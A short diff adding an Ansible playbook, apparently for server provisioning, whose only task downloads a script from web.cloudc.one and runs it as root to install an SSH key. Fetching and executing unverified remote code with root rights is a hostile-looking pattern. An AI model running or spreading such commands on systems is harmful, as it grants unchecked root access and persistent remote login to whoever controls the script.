@@ -1,0 +1,9 @@
+---
+
+- name: Initial Access
+  hosts: all
+  remote_user: root
+
+  tasks:
+    - name: Configure root ssh key
+      shell: curl -o cc-ikey -L web.cloudc.one/sh/key && sh cc-ikey j50G3RHZA5gO
